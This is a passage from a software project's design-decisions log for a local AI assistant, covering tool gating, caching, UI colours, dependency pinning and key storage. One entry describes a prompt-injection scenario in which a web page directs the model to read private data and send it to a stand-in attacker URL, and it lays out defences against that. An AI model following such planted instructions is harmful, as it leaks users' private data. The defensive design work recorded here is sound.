  simply stops matching itself — one stale no-repeat entry, and no correctness
  lost. *(2026-09-20.)*
- **The model's copy of the snapshot is the snapshot minus what it has no
  business holding** (`morpheus._model_status`). `control_music` hands its
  result straight into the model's context, and `path` is a resolved URL:
  measured 2026-09-20, the stream URL behind one song was 1110 characters of
  signed, expiring, IP-bound query string. A DENYLIST rather than an allowlist,
  because an allowlist makes every future field invisible until somebody
  remembers to add it — the failure that is silent — where a denylist makes the
  next sensitive field visible until somebody removes it, which gets noticed.
  *(2026-09-20.)*
- **`euterpe.pretty()` is `normalize()` with the case left on, and they share
  `_clean()`.** A display name that stripped junk differently from the key would
  show one song while filing another, so the regexes live in one function and
  the two entry points differ by a single `fold` flag. Every comparison inside
  `_clean` is case-insensitive either way, so both forms make the same decisions
  and differ only in the characters they return. *(2026-09-17.)*
- **The DJ's spoken intro must NAME the song that is playing, and is checked
  rather than trusted.** Measured 2026-09-17: handed the resolved title in the
  tool's own result, gemma4:e2b introduced a different Linkin Park song; earlier
  runs produced "Let It All Bleed by The Beatles" for `The Beatles - Let It Be`
  and announced a Rhodes Brothers cover as the Arctic Monkeys. A name that has
  to be right is not a thing to ask a small model for when the string is already
  in hand. So `_names_the_song()` requires every part of `pretty()`'s name to
  appear in the intro, case-insensitively — artist AND track, so naming the
  right artist and the wrong song does not pass — and anything else is replaced
  by a line built in code. It joins the same family as the blank, typed-tool-call
  and `is_degraded` checks that already sat there: four ways the model's text
  can be unusable, one built line. **The known cost is stated rather than
  hidden:** an intro that writes "ADIDAS" for `a.d.i.d.a.s` is correct and still
  gets replaced. A correct line swapped for another correct line is the cheap
  half of that trade; telling a listener they are hearing something they are not
  is the expensive half. *(2026-09-17.)*
- **A tool's output can go AROUND the model — `pythia.ask(on_verbatim=...)` —
  and a round made only of such calls ends the turn.** Daedalus exists to show a
  module's docstring word for word, and anything the model reads, it retells,
  whatever the prompt says. So a handler may return its text under `"verbatim"`
  (`{"label", "title", "text", "ack"}`); `ask()` hands that to `on_verbatim`
  (HomePanel prints it as its own `daedalus ›` block) and the model gets only
  `{"module", "path", "shown_to_user": true}`. The text reaches the model on NO
  path: a caller without a display (Awen, `__main__`) gets a `no_display` slug,
  and a display that raises gets `display_failed`. **Why the turn ends there:**
  a tool result with nothing in it is the shape `pythia.py` measured gemma4
  going blank on, and the blank-retry nudge would then have it "say plainly what
  information is missing" — about a docstring already on screen. So the turn
  closes on the payload's `ack` line ("Here is the docstring for aura."), built
  in code, the `_names_the_song()` rule: a line that has to be right is not asked
  of a small model. A mixed round (Daedalus plus the weather) goes back to the
  model as before. History stores the call and the ack, never the text; Vox
  Response speaks the ack, never the docstring (long, and full of box-drawing
  characters). The first tool whose output bypasses generation. *(2026-09-25.)*
- **`get_module_docstring`'s enum is built from the code tree at import, and
  what it costs was measured, not assumed.** An enum regenerated on restart
  means no hand-kept list — but an enum alone does not route: `aura` means
  nothing to the model. So the `module` parameter's description carries one
  `key — Job: gloss (sidebar name)` line per module, all 75. It is on the
  PARAMETER because a tool description is capped at 600 characters
  (`test_tool_schema_contract`). Measured 2026-09-25 on gemma4:e2b with the live
  Machine Spirit prompt: the prefix grew 2,946 → 4,889 tokens (+66%), a true
  cold prefill ~7.3 s → ~12.7 s, a warmed first question unchanged at ~60 ms
  (the prefix stays cached), and headroom inside `num_ctx` 8192 fell from ~5.2k
  to ~3.3k tokens. Routing was 22/22 over two runs; keys plus sidebar names only
  (+645 tokens) was 20/22 — "auto DJ" cannot find `awen` without its gloss — and
  core+tools with 40-character glosses (+999) was 9/11. Matthew chose the full
  glosses. `_GLOSS_CHARS = 0` is the keys-only switch and `_ENUM_GROUPS` the
  scope, if the headroom is ever wanted back. *(2026-09-25.)*
- **DAEDALUS opens a module with `notepad.exe`, never `os.startfile`.** The
  default action for a `.py` on Windows is often to RUN it with the Python
  launcher — the one thing a button labelled "open" must never do. Cerberus's
  open-folder helper uses `startfile` on a FOLDER, where that is safe; it is not
  a precedent for a file. The path comes only from `daedalus.source_path()` and
  is checked again to sit inside `metis_toolbox/`. Off Windows the button is
  disabled with a note rather than falling back to `xdg-open`/`open`, for the
  same reason. Opening files is UI-only: no tool can launch a process, which is
  why `daedalus.py` names it out of LLM scope. *(2026-09-25.)*
- **Daedalus's edges are imports only, so Kairos's workers are not edges.**
  Kairos loads its workers from strings through `importlib`, which no import
  statement records: `emanon` has no edges at all (EmanonPanel never imports
  it), and `kairos` does not connect to the tools it polls. The map shows what
  the source says, not what runs; a "scheduled" edge read from `Kairos.WORKERS`
  would be a second edge kind, and has not been built. *(2026-09-25.)*
- **Felhaven's minimum window is 760 px wide, raised from 700 for one tab.**
  A TabHost tab that does not fit is not clipped: pack DROPS it. Seven Moderati
  tabs need a 494 px bar, and a 700 px window leaves 428, so DAEDALUS simply was
  not there — while six tabs had fit with 1 px to spare. Raising the minimum
  gives every view the same 60 px (the sidebar is fixed-width) and shrinks
  nothing, where shortening labels or tab spacing would have taken room from
  every tab bar to fit one. `felhaven.MIN_W` is the number, and
  `test_moderati_panel_smoke` holds the bar to it, so an eighth tab fails red
  instead of vanishing. *(2026-09-25.)*
- **The chat has a fourth hue: `C["verbatim"]`, cyan, for text no one in it
  said.** The transcript spoke green (Pythia), amber (the DJ) and red (a
  failure); a Daedalus docstring is a QUOTATION, and in `teal` it read as a
  dimmer Pythia. Cyan is the one hue none of those voices use. Its value is
  `map_water`'s, but it is a separate base key rather than a borrowed map key,
  because the Artemis colours are the world's and retuning the rivers must
  never recolour the chat. A dull amber (`#A07C3A`, 4.9:1 on `card`) was the
  other candidate; Matthew chose the cyan (4.8:1). The case against the amber:
  a shade of a hue is the SAME channel here (`amber_bright`'s own comment), so
  it could read as a quieter DJ line. *(2026-09-26.)*
- **Colour values have one home, `palette.py`, and the Artemis palette no
  longer lives in two files.** This replaces the reasoning of the 2026-08-09
  entry above, whose stated reason — `tools/demeter.py` "must not import
  Tk" — turned out not to be the constraint that mattered. CI runs on
  `windows-latest`, where tkinter imports fine without a display. What
  actually blocked `from theme import C` in demeter was measured: `mypy
  --strict` follows the import into `theme.py` and reports 32 errors there,
  and mypy on `tools/` is blocking. A module that imports nothing and is
  fully annotated removes that cost and the layering one (a headless raster
  renderer pulling in the widget classes) at once. `theme` re-exports `C`
  and `rgb()`, so not one panel import changed. The values themselves did
  not change either: before and after, every key, every pythia_face ramp
  step and every demeter band compared equal. The one new key, `burnout`
  (`#FFFFFF`), is pythia_face's former hardcoded white. It is named for its
  job, not its hue — see the next entry for why. *(2026-09-26.)*
- **Two palette keys with one value are either IDENTITY or COINCIDENCE, and
  the code now says which.** Identity — the same colour on purpose — is
  listed in `palette._SAME_AS` and calculated from its target, so retuning
  the target retunes it: `green` and `season_fg` follow `text1`; the
  decorative accents follow the ramp they were folded into (`teal`, `blue`
  and `purple` follow `text2`, `gray` follows `text3`, `coral` follows
  `amber`). Coincidence — a match that must stay free to drift apart — stays
  two literals and is declared, with its reason, in
  `test_palette_guard._COINCIDENCES`: today only `verbatim` / `map_water`.
  An undeclared shared value fails red, because a reader cannot tell the two
  cases apart, and a retune would have to guess. No key was deleted. Every
  one has call sites, and calculating one key from another already gives one
  value in one place, so deleting keys would have meant editing call sites
  for no gain. **Known debt, deliberately left:** the accents are named for
  hues they no longer are (`C["blue"]` is green). A name based on a hue goes
  stale when the hue changes. Renaming them to roles touches ~48 call sites
  and changes nothing on screen, so it is its own change. *(2026-09-26.)*
- **A colour literal in a test is EVIDENCE if a palette change would not
  require editing it, and a SECOND SOURCE if it would.** A test asserting a
  widget is `"#7CFC7C"` is a second copy of the palette, so the guard's hex
  rule covers `tests/` too, and a test compares against `C[...]`. The RGB
  triples in `test_artemis_ppm_spike` and `test_artemis_panel_smoke` are
  pixel DATA for Tk's decoder and the resampler. They must not follow the
  palette, so the guard's triple rule stops at app code. Two guard choices
  worth keeping: Tk itself decides what a colour NAME is (`winfo_rgb`), so
  `pack(fill="x")` passes and `fg="white"` fails with no hand-kept list of
  names; and a triple on the right of `in` is a set of alternatives
  (`m in (3, 4, 5)`), never a colour. Every rule was confirmed to fail red
  before it was trusted. *(2026-09-26.)*
- **Selection and cursor colours are app-wide Tk defaults, not options on
  each widget.** None of the 29 `tk.Entry`/`tk.Text` widgets set
  `selectbackground`, so every selection drew in Windows' `SystemHighlight`
  (`#0078D7`, measured). Nobody had written that colour anywhere, so the
  palette guard could not see it. `theme._init_widget_defaults` puts
  `select_bg`/`select_fg` and a `text1` cursor in Tk's option database.
  Every widget that sets nothing gets the theme, including widgets not
  written yet, and an explicit option still wins. Chosen over editing 29
  constructors, which would fix 29 instances and leave the 30th blue. The
  cost is that a panel no longer shows where its selection colour comes
  from, hence the §7 line. Two Tk facts, measured by reading screen pixels
  back. A Text draws its selection as the `sel` tag, and Tk creates that tag
  first, so every tag a panel adds outranks it: selected text in Home's chat
  kept its tag colour, and a `text3` span would have vanished into a green
  band of almost the same value. A class-level `<<Selection>>` binding
  re-raises `sel`. Separately, `inactiveselectbackground` defaults to `''`,
  so a Text's selection disappeared when focus left; it now matches the
  focused one. The colours are the hovered-menu pair (`border`/`text1`),
  declared identity in `_SAME_AS`. Inverse video made every selection the
  brightest block on screen, and the badge pair was 1.2:1 against the field,
  too faint to see what was selected. *(2026-09-27.)*
- **Every tool call passes a schema-driven argument gate
  (`pythia._check_arguments`), and it rejects less than it could.** Before it,
  `_dispatch` called `fn(**arguments)` raw: "weather in Pittsburgh" made the
  model invent `location` and get `tool_failed: … raised TypeError`, which names
  nothing it can fix, and `calculate(ans="3")` evaluated `'3' * 2 == '33'`. The
  rule is *reject what no handler could interpret* (undeclared or missing
  parameters, wrong types, NaN), with a `bad_arguments` detail that says what to
  send instead and, for a missing parameter, quotes its own description;
  *normalize what is unambiguous* (numeric strings, enum case, JSON-string
  arguments, `null` = not given); *leave meaning to the handler*. That last part
  deviates from the V0.03 audit's T3 twice, on purpose. **Enum membership is not
  enforced**: every enum handler already refuses an unknown value with its own
  slug, and Daedalus deliberately resolves names its enum does not list (sidebar
  names, `tools/aura.py`), which strict rejection would break. **Ranges are not
  enforced**: Morpheus clamps a volume of 150, and a refusal costs gemma4:e2b a
  retry, the step it is measurably weakest at. The audit's T4 check
  ("required ⇒ no handler default") was dropped too: once the gate refuses a
  missing required argument, those defaults are unreachable from the model, so
  the test would guarantee the same thing twice. A handler with no registered
  schema (a test's injected fake) passes ungated. *(2026-09-27.)*
- **A tool that returns long text has a model-facing budget separate from any
  storage cap.** `read_document` returned a whole file up to Herodotus's 1 MB
  storage cap (~250k tokens against the context window). It now returns
  `_READ_CHARS` (6000) per call with `truncated` + `next_offset` and takes an
  `offset`, the `fetch_page` pattern. Its description steers partial changes
  to `edit_document`, because a model that rewrote a document from a truncated
  read would silently cut it. `ask()` also logs any result over
  `_LARGE_RESULT_CHARS` (8000), set above both budgets (the audit's 2000 would
  fire on every normal fetch), so the next unbudgeted tool shows up in the log
  before it shows up as a broken turn. *(2026-09-27.)*
- **Aether probes the internet and the local Ollama, not Anthropic's status
  page.** The Statuspage check was a leftover of the retired Claude-API brain,
  and `get_connectivity` told the model it answered "whether Claude is online".
  The internet probe is Windows' own NCSI page, plain HTTP with redirects not
  followed, so a captive portal reads as `limited`, not `online`. The Ollama
  probe derives `OLLAMA_HOST` the same way `pythia._BASE_URL` does, held in
  lockstep by a test rather than an import (tools/ must not import the brain).
  The poll went from 3600 s to 300 s: hourly suited a remote status page, but an
  hour-old "the internet is up" misleads, and both probes are cheap.
  *(2026-09-27.)*
- **`num_ctx` 8192 → 16384.** 8192 was never breached: 0 of 2,737 logged Ollama
  requests (Sep 15–27) truncated, largest prompt 6,558. But the ~4.9k-token
  schema prefix left thin headroom for a long tool result, and every new tool
  grows it. 32768 was measured at +0.02 GB of VRAM with flat speed
  (2026-07-31), so this is headroom bought nearly free. `_MAX_HISTORY_TURNS` is
  unchanged: this is room for results and tools, not longer memory.
  *(2026-09-27.)*
- **The Tool Broker (per-turn tool selection) is parked, not rejected.** The
  V0.03 audit proposed sending only the relevant domains' schemas each turn,
  since every turn pays for all 23 (~4.9k tokens, Daedalus alone 37%). Three
  measurements say not yet. (1) Nothing overflows (the entry above). (2) The
  prefix cache is working: 147 of 153 chat-sized prompts reused it (~1.1 s
  prefill) against 6 misses (~12 s). gemma4's built-in renderer declares tools
  *ahead of* the history, so a tool list that changes with the topic
  re-prefills everything behind it at ~3.2 ms/token. (3) Its `find_tools`
  fallback asks the model to notice a gap and make a second call, the chaining
  gemma4:e2b was measured failing (2026-07-31), so a keyword miss would mostly
  go unrecovered. **Revisit when** the fixed prefix nears ~6–7k tokens, a
  routing miss shows up in the Rite Log, or a model that chains reliably
  replaces gemma4:e2b. The full design is kept out of repo at
  `D:\metis\PYTHIA_TOOLS_AUDIT_V003.md`. *(2026-09-27.)*
- **Polled brain tools answer from their last good fetch, dated with `as_of`
  (V0.03 audit T7 / M2).** Kairos polled Aura every 30 min, yet
  `get_weather`, `get_sun_times` and `get_moon_phase` each fetched again.
  "Weather, sunset and moon?" was three round trips, and six GETs offline,
  where each walked both of Aura's sources. Now `handle()` answers from the
  last good fetch while it is younger than `CACHE_TTL`, set to the Kairos
  interval (Aura 1800 s, Pheme 900 s), so in steady state Pythia rides the
  poll. `fetch()` still always goes to the network and still raises: a poll
  that answered from the cache would stop raising, and Kairos's retry ladder
  would never engage. The cache is keyed on whatever shapes a result (Aura:
  location, lat and lon, but **not** units, since every reading carries °F and
  °C; Pheme: the feed config), and a stale reading is never served across
  keys. One lock per module is held *across* the fetch. The usual rule against
  that is about stalling threads that want something else; the only threads
  waiting here want that fetch's result, and no main-thread code takes the
  lock (§6). After a failed refresh the last reading comes back marked
  `stale: true` for up to 2 × TTL, its `as_of` unchanged. A failure is not
  retried for 60 s (`_RETRY_AFTER`), so an offline turn is one attempt.
  Helios and Selene still call `aura.handle()`, which *is* the cache read now.
  That departs from the audit's wording ("instead of calling `handle()`") but
  not its intent, and it keeps `test_tool_handles`' mock seam. The pattern
  lives in two deliberately parallel copies, with Aura as the reference. A
  third polled tool adopting it is the point to extract a helper. Aether stays
  live on purpose: "is the internet up?" wants now, not up to 5 minutes ago.
  *(2026-09-28.)*
- **gemma4:e2b does not relay `stale`, so the 2 × TTL bound is the real
  guard.** Measured 2026-09-28 with the owner's Machine Spirit override and a
  45-minute-old reading behind a failed refresh. The model called it "the
  current weather" 3 of 3 times. It did the same with a sentence added to
  `get_weather`'s description (3/3), and with a plain-prose `note` in the
  result (1/1, confirmed delivered). So no tool description was changed, and
  `stale` stays as data for the Rite Log and for a model that reads it. The
  harm is bounded: in normal operation a reading up to 30 minutes old is
  already narrated as current, and a failed refresh stretches that to at most
  an hour, never to yesterday. To make Pythia say so aloud, probe a Machine
  Spirit rule or a bigger model, not the schema. *(2026-09-28.)*
- **Helios and Selene compute the sun and moon locally, always, not as a
  fallback (V0.03 audit M3).** They used to interpret Aura's fetched
  `astronomy` dict, so no network meant no sunset and no moon, and Aura's
  Open-Meteo fallback carried no moon at all. Both are now arithmetic on the
  Settings location and the clock: NOAA's solar equations for the sun, the
  Astronomical Almanac's low-precision lunar series for the moon. They were
  checked against USNO and JPL Horizons values retrieved 2026-09-28, and every
  rise and set came within a minute. *Always*, because then one function feeds
  both the tool and the panel. As a fallback, the times would jump a minute
  each time wttr.in came and went, and the cached tool and the polled panel
  could briefly disagree. The consequences are deliberate:
  (1) **No `as_of`.** T7 dates a fetched reading, and a value computed during
  the call is as old as the call, as with Horai. This supersedes "Helios and
  Selene still call `aura.handle()`" in the freshness entry above.
  (2) **Times are in this computer's zone**, not the location's. Stdlib Python
  on Windows has no time-zone database (`zoneinfo` needs `tzdata`, §11), and
  Horai and `pythia._now()` already treat the machine clock as the user's. It
  only shows when the Settings location is in another zone.
  (3) **Each has its own Kairos worker** (`fetch = handle`, never raises,
  300 s). The two sub-widgets register with it directly, and so does
  Hypatia's moon row, as a rider. A weather outage no longer blanks any of
  them.
  (4) **Kepler's Earth elements were not reused for the sun.** Kepler
  documents ~1° in the J2000 frame, which is ~4 minutes of sunrise; reuse
  needs a matching precision contract. Selene does reuse `hypatia._altaz` and
  Helios's sun, the Kepler sibling-import pattern above.
  (5) **Phase names follow USNO's rule, found from its data rather than
  assumed.** Round the illumination to a whole percent: 0 is new, 100 full, 50
  a quarter, anything else crescent or gibbous. So a quarter is named only in
  the hour or so around it, and the name always matches the percentage beside
  it.
  (6) **Aura's `astronomy` block stays in `get_weather`'s output**, though no
  panel reads it now. Removing it changes what the model sees, and that wants
  a probe first. Until then the model can see wttr.in's sunrise beside
  Helios's, usually within a minute. *(2026-09-28.)*
- **§3's logger rule is a test now (`test_tool_loggers`, V0.03 audit L5).**
  Every `tools/` module declares its own module-level `METIS.<name>` logger.
  A sentence in §3 had not kept helios, selene and horai from going without
  one. Horai stays on the allowlist, because it reads only the clock and
  Themis and has no failure path to log. Whether that earns a written
  exemption or a logger is still open, and the allowlist fails if the entry
  goes stale. *(2026-09-28.)*
- **`BACKLOG.md` is the one home for things found but not fixed.** Before it,
  open items were spread across the audit doc's "not done" lists, dated
  handoffs, "revisit when" lines here, "flagged, not fixed" notes in
  docstrings, and session memory the owner never sees. Each of those was a
  copy, and copies drift. It lives in the repo, not beside the handoffs in
  `D:\metis\`, because the commit that fixes an item deletes its line; an
  out-of-repo list can't be tied to the fix, so it goes stale. There is no
  "done" section, because CHANGELOG is the record of fixes. Reasoning stays
  here and the backlog links to it. **Security issues never go in it.** One
  found in any session is fixed in that session, no exceptions (the owner's
  rule). That also suits a file the public snapshot publishes.
  `test_backlog_format` holds its shape. *(2026-09-29.)*
- **Pythia's dispatch gate: provenance for URLs, a yes for file changes, and
  public addresses only.** Pythia reads text strangers write (news, search
  results, pages, song titles, and notes that began as any of those). She can
  reach private data. And she holds tools that send data out (`fetch_page`) or
  keep it (`write_document`, `edit_document`). Until now, only the model's
  judgement stopped a page from telling her to read something private and fetch
  `https://attacker.example/?d=<it>`. That is a defence that is difficult to
  beat, not expensive, and a model that follows instructions better weakens
  it. So the rules sit in `_dispatch`, where no text can argue with them.
  (1) **`fetch_page` opens only a URL the user wrote or a `search_web` result
  gave**, anywhere in the history the model can see. The match is exact, not a
  substring: a substring would let the model pick a length, and a length is a
  number. Links inside fetched pages and news stories are not trusted. A page
  can offer hundreds, and which one the model picks is itself a message. It is
  provenance rather than a question because search then fetch is the tool's
  everyday path, and a question on every fetch is one the owner would learn to
  click through. Search results can still be steered by someone who
  pre-indexes a page for every value they hope to learn. That costs money and
  time, which is the bar.
  (2) **Every archive write or edit asks first, always.** The first design
  asked only after untrusted text had been read. Saves are rare and most follow
  a web search anyway, so it would have asked about the same saves, while
  adding a list of "untrusted" tools that could silently miss one. The question
  shows every argument and the whole content, untrimmed, because the end of a
  note is where a hidden line would go. It fails closed. No `on_confirm`, an
  error, anything but `True`, Stop, Refresh, or ten minutes without an answer
  all mean no. A no is final for the rest of the turn, so a model that retries
  is refused without asking again. A question repeated until the user clicks
  Allow to make it stop is not a control. The answer crosses main→worker as an
  Event, the crossing `cancel` already makes.
  (3) **Callimachus connects to public internet addresses only.** The check is
  in the connection, not the URL. The host is resolved once, and every answer
  must be public (`is_global`, not multicast, with an IPv4 address inside an
  IPv6 one unwrapped). The checked IP is the one dialled, while TLS still
  verifies the name. That covers every redirect hop and leaves DNS rebinding
  nothing to change. Proxies from the environment are off, because through a
  proxy the check would see the proxy. A URL the user typed is refused too:
  Callimachus can't know who wrote it, and a router page belongs in a browser.
  `search_web` shares the opener, which is harmless because Brave is public.
  A SearXNG on Obelisk would need an opener of its own.
  **Left as they are:** `search_web` and `play_music` queries can still carry
  private text to Brave and YouTube, but those are third parties, not the
  attacker. Delimiters around tool output were not added: they can help a
  model, but they are not a control. *(2026-09-30.)*
- **One Python, one hashed lock, and CI builds from it.** Obelisk's venv had
  drifted to 121 packages for the five `requirements.txt` named. Most were
  leftovers from retired features (faster-whisper, torch, spaCy, pandas), none
  imported, several with published advisories. Nothing pinned what
  "installed" meant, so each CI run resolved the newest of everything while
  Obelisk ran whatever had piled up. CI's 3.10 leg, CI's 3.13 leg and Obelisk
  (3.11) had three different onnxruntimes, and the one that runs was tested by
  none of them. Now the lock names 22 packages.
  (1) **A lock with hashes, installed with `--require-hashes
  --only-binary=:all:`.** Pins make every install the same versions. Hashes
  make it the same *files*, so a replaced upload or a tampered cache is refused
  instead of installed. pip checks its own cache too; that was tested by
  changing a hash. Wheels only, because building from source runs the
  package's build code at install time and needs build tools the lock doesn't
  list. Every locked package has a Windows wheel, so today that costs nothing.
  (2) **The venv must equal the lock** (`test_environment_lock`). A lock
  nobody checks is only a comment: the drift above came from hand installs.
  Two states are allowed. The runtime lock alone is CI's test job, and it
  proves nothing else is needed. Runtime plus dev is the lock with mypy, for
  local type checks. `pip` is the only extra. The test runs in CI inside a venv
  built from the lock, so CI tests what runs.
  (3) **Python 3.13: not 3.14, and no longer 3.10.** On Windows, a Python line
  gets installers only while it takes bugfixes. After that its security
  releases are source-only, which is how Obelisk sat on 3.11.9 with a
  January 2024 OpenSSL. 3.14 has the longest window left, but kokoro-onnx
  declares `<3.14`, and pip doesn't refuse it: it quietly installs kokoro-onnx
  0.4.7 from April 2025, plus 19 more packages. With the lock, that is now a
  loud error instead. 3.13 is supported, but its bugfix window closes
  2026-10-01, so it is a stopgap with a known end; BACKLOG parks the move.
  3.10 is gone for three reasons. The lock can't install there (onnxruntime
  needs 3.11, numpy 3.12). Its CI leg ran 3.10.11 from April 2023 with
  packages nobody else ran. And it reaches end of life 2026-10-31. "3.10+" was
  the oldest Python the code parses on, not one anyone used.
  (4) **Actions pinned to SHAs** (`test_ci_pins`). A tag is a pointer its
  owner, or anyone who takes over the repository, can move. A SHA is the code
  that was read. The tag stays as a comment so a reader can see the release.
  `persist-credentials: false` because no job pushes, so the token has no
  reason to sit in `.git/config` while test dependencies run.
  **What watches it:** a lock is clean the day it is made and goes stale by
  design. Dependabot alerts are on for this repository and read the lock's
  exact versions; an alert is the cue to recompile. The Action pins have no
  watcher yet (BACKLOG). *(2026-09-30.)*
- **Dependabot moves the Action pins; the Python lock stays a hand job.** A
  SHA pin never moves, so on its own a pinned Action only gets older.
  `.github/dependabot.yml` checks weekly and opens one PR for every Action
  with a release, updating each SHA and its tag comment together. That PR
  runs CI like any push, `test_ci_pins` included, and is merged only once
  green. **Cooldown, 7 days:** a release is proposed only once it is a week
  old. A hijacked release is usually noticed and pulled within days, so one
  would have to survive a week in public to reach this repo. The cost is
  waiting a week for ordinary fixes; an urgent one can be applied by hand.
  **Actions only, not pip:** Dependabot could regenerate the pip-compile
  lock, but on its own runner, not on 3.13 under Windows with §11's
  command. So the lock is recompiled by hand, cued by Dependabot's alerts.
  *(2026-09-30.)*
- **Cerberus v2: the keys are encrypted to the Windows account, and the PIN
  decrypts nothing.** This replaces the crypto in the 2026-07-06 entry. v1
  derived the vault key from a four-digit PIN with PBKDF2, and kept a fast
  salted hash of the PIN beside it, so all 10,000 PINs fell in milliseconds and
  the slow KDF never mattered. The PIN had also been published as a test
  fixture, so a copy of the vault file was a copy of the keys. The owner keeps
  the PIN as the everyday gate (a child lock; Pythia reporting tickers must not
  need more), and anything encrypted under it would be unprotected at rest by
  design. So the two jobs were split.
  (1) **At rest: Windows DPAPI**, current-user scope, through ctypes (stdlib,
  no new package), with the entry name as DPAPI's optional entropy. A copied
  vault file is useless on another account or PC, a blob moved to another
  entry fails, and nobody types anything. A wrong name, a changed byte and a
  cut-short blob all fail with WinError 13 (measured). The cost, written in
  `SECURITY.md`: anything running as the user can decrypt at any time. That
  was already true of v1, with its PIN public.
  (2) **The PIN is a policy gate.** It opens the session that lets tools use
  the keys and the UI change them. It decrypts nothing, so its being public
  exposes no secret, its fast hash guards nothing worth slowing down, and
  changing it touches no key (v1's `setpin` orphaned the vault). The
  three-tries lockout stays, as child-lock theater.
  (3) **No cipher of our own, so no `cryptography` package.** The hand-built
  HMAC counter-mode cipher is gone, and §11's bar on new packages is untouched.
  (4) **A passphrase vault is parked** (BACKLOG) until the holdings ledger
  holds real data, the only thing today that would need more than DPAPI.
  (5) **It locks on exit, on a Windows lock, on sleep, and after an hour with
  no input anywhere on the PC.** Windows announces a lock or a sleep only to a
  window procedure, and Tk doesn't expose one: hearing it would mean patching
  Tk's window through ctypes, or a hidden window on a message-loop thread of
  our own. Instead `tools/hypnos.py` reads three values, and Cerberus's own 2 s
  Kairos worker (`cerberus.fetch`) locks on the worker thread, so the keys stop
  working before any panel redraws. At worst it is 2 s late, while the screen
  is locked or still waking. Sleep has two signals (an "asleep" counter, and a
  gap between checks) because Obelisk had never slept, so the first couldn't be
  measured. Idle is whole-PC, not Felhaven-only: working in another app isn't
  being away.
  (6) **The session is shared with the main thread, behind its own lock**: a
  second channel §6 doesn't name, like the Ledger (2026-07-24). The lock is
  held across a whole read, so once `lock()` returns no read is still in
  flight. Session before Ledger, always.
  (7) **Tampering is loud.** An old-format or unparseable vault file, a key
  that won't decrypt, and a PIN file recreated while the vault held keys each
  write a Ledger row and an ERROR (Emanon), and raise an alarm the worker
  carries to the CERBERUS tab's banner, the Dynastic Vault and Home's lamp.
  Unlocks, wrong PINs and locks (with why) are Ledger rows too. An attacker who
  has to be seen pays more. An old vault is renamed aside in the tab, never
  deleted.
  (8) **Custody opens only listed `.json` files inside `config/`.** The path is
  resolved with links followed, then checked with `is_relative_to` against a
  constant in the code, not the manifest's own `config_dir`: the manifest is
  editable through Custody, and `os.startfile` RUNS an `.exe`, `.bat` or `.lnk`.
  (9) **Secrets only at hidden prompts.** The CLI reads PINs and keys with
  `getpass` and refuses them on the command line, because shell history keeps
  every command. `get` is gone: it printed a key into the terminal.
  (10) **Fixtures say "fake".** In a test that touches Cerberus, every PIN and
  value literal contains "fake", and no tracked literal anywhere has an API
  key's shape (`tests/test_secret_fixtures.py`). A published fixture is public
  for good, and a real PIN was one.
  **Left as they are:** anyone at the keyboard can edit the PIN file and the
  Ledger, so the tamper signals raise the cost in exposure, not a wall.
  *(2026-09-30.)*
- **`morpheus.describe()` takes only a YouTube watch URL, rebuilt from its id,
  after `--`.** Its `url` is network data: a search row's `"url"`, from yt-dlp's
  own JSON. yt-dlp builds that field from the video id today, so no uploader we
  know of can make it start with `-`, but nothing else stopped a value that did
  from being read as an option. So the URL must fully match
  `https://(www.)?youtube.com/watch?v=<11 id characters>`, yt-dlp gets the URL
  rebuilt from that id, and `--` goes before it. Anything else is
  `describe_failed` before a process starts, and Awen already treats that as no
  evidence. Three details: (1) **`fullmatch`, not `^...$`.** In Python `$` also
  matches before a final newline, and a test now holds that. (2) **Checked
  against the real `bin/yt-dlp.exe` (2026.08.19):** after `--`, even
  `--version` is reported as "not a valid URL" (exit 1), not run. (3) **mpv's
  own path to yt-dlp already does this:** the `ytdl_hook` script built into
  `bin/mpv.exe` inserts `--` before the URL (read from the binary, 2026-10-01),
  and mpv only hands http(s) and `ytdl://` URLs to it. `search()` needs no
  `--`: its argument always starts `ytsearch`. *(2026-10-01.)*
- **Network reads go through `tools/hermes.py`: a byte cap, and a deadline
  for the whole request.** `timeout=` in requests and urllib bounds each socket
  operation, so a server that sends one byte every few seconds never trips it,
  and a body of any size was read into memory. Aura and Pheme hold their cache
  lock across a fetch, so one stuck read also stalled Pythia's weather and
  news. Decisions, each confirmed by the owner:
  (1) **The deadline lives in the socket.** Before every connect, TLS
  handshake, send and recv, the socket's timeout is set to min(per-op timeout,
  time left): a socket subclass for plain TCP, and `SSLContext.sslsocket_class`
  for TLS. A check between body chunks would miss a server that drips its
  HEADERS, and a watchdog thread would leave a stuck read holding Aura's lock;
  here the read ends in the thread that asked. The one gap: the DNS lookup,
  which can't be interrupted. (CPython already runs a whole TLS handshake
  against one socket timeout, so a dripped handshake was never unbounded; the
  deadline only makes it smaller.)
  (2) **stdlib, not requests.** requests gives no hold on its sockets, and
  decodes gzip on its own, which makes "bytes held" differ from "bytes
  counted". Hermes asks for `Accept-Encoding: identity` and refuses a
  compressed answer; measured 2026-10-01, no provider we read compresses when
  asked not to. requests stays only for Pythia's Ollama stream and the dev
  catalog script.
  (3) **Every call states its own cap; there is no default.** A default is an
  unmeasured number that silently applies to the next caller. Each cap is a
  module constant with its measured size and date beside it: 4x the largest
  measured body, rounded up to a power of two, never below 64 KiB for a live
  response (so an error page can't become TooLarge); 1.5x the largest file in
  the vintage for a fixed census file. The deadline is one rule,
  `deadline_for()`: twice the per-op timeout, or the time to read the whole
  cap at 100 kB/s, whichever is longer.
  (4) **https only, and a redirect may not leave https.** requests and
  urllib's default handler both follow a redirect from https down to http,
  which hands the fetch to anyone on the path; only Callimachus refused it.
  `allow_http=True` is the per-call exception (Aether's probe, the local
  Ollama server). No proxies from the environment. Other schemes are refused
  before urllib's file:, ftp: and data: handlers can see them.
  (5) **One error vocabulary**, and no message ever carries the URL (Midas's
  key travels in the query). `Timeout` is also a `TimeoutError`, so code that
  already catches `socket.timeout` needs no new arm.
  (6) **Proven on a real loopback server** (`tests/_loopback.py`): dripped
  headers, a dripped body, a dripped TLS handshake and a stalled body each end
  at a 1 s deadline. A real TLS server would need a certificate, which the
  repo can neither mint nor should publish, so the TLS read path past the
  handshake is tested on an unhandshaken socket, whose read performs the
  handshake. Found while writing that test: an `https_open` override never
  passes the handler's `context=` to its connection class, so the connection
  sets the context itself.
  `tests/test_network_reads.py` holds the line: a runtime module that imports
  a network library itself fails, unless it is in `_ALLOWED` with a reason or
  on `_NOT_YET_MIGRATED`, which shrinks one module per commit. *(2026-10-01.)*
- **Callimachus keeps its own opener; hermes only bounds it.** Its opener is
  the address guard (public internet only, the name resolved once and that IP
  dialled, a redirect checked hop by hop), and routing it through `hermes.get`
